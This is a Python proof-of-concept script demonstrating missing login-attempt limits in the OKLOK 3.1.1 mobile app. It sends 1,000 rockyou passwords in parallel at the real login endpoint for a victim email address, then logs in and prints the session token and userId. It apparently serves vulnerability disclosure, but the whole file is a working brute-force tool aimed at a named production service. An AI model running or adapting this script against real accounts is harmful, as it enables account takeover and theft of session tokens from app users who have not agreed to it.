#!/usr/bin/env python3

#Demo "CWE-307: Improper Restriction of Excessive Authentication Attempts" in the OKLOK 3.1.1 mobile app

import requests
import json
import sys
import getpass
import itertools
import datetime
import multiprocessing
from functools import partial

#fail login for all words in wordlist
def fake_brute_force(password, victim_email_address, headers, url):

	print(f'[*] Trying {password}...')

	body = {"code":password,"account":victim_email_address,"type":"0"}
	response = requests.post(url, data=json.dumps(body), headers=headers)

#login with the real password 
def login_victim(real_password, victim_email_address, headers, url):

	print(f'\n[*] Trying real password {real_password}...')

	body = {"code":real_password,"account":victim_email_address,"type":"0"}
	response = requests.post(url, data=json.dumps(body), headers=headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print(f'[*] Login Successful!\n')
		print('=============================================================')
		print('LOGIN DETAILS:')
		print('=============================================================')
		print('password: ' + real_password)
		result = json_resp['result']
		token = result['token']
		userId = result['userId']
		print('token: ' + str(token))
		print('userId: ' + str(userId))
		
		end_time = datetime.datetime.now()
		total_time = end_time - start_time
		
		print('-------------------------------------------------------------\n')	
		print('Total Execution Time: ' + str(total_time))
		print('-------------------------------------------------------------\n')

	else:
		sys.exit('[*] Login not successful.')


#main 
if __name__ == '__main__':

	start_time = datetime.datetime.now()  

	wordlist_filename = 'rockyou_first1000.txt'

	headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Content-Length': '70',
	'Accept-Encoding': 'gzip, deflate, br'}

	url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

	if len(sys.argv) is not 2:
		sys.exit('Usage: python3 ownklok_bf.py <victim_email_address>')
	else:
		victim_email_address = sys.argv[1]
		real_password = getpass.getpass('Real Password: ')
		fbf = partial(fake_brute_force, victim_email_address=victim_email_address, headers=headers, url=url)

	with open(wordlist_filename, "r") as wordlist:
		passwords = wordlist.read().split("\n")

	print('\n-------------------------------------------------------------')
	print('[*] Attempting to log in...\n')

	
	num_workers = multiprocessing.cpu_count()
	#chunk_size = round(len(passwords)/num_workers)
	pool = multiprocessing.Pool(num_workers)
	pool.imap_unordered(fbf, passwords)
	pool.close()
	pool.join()

	login_victim(real_password, victim_email_address, headers, url)
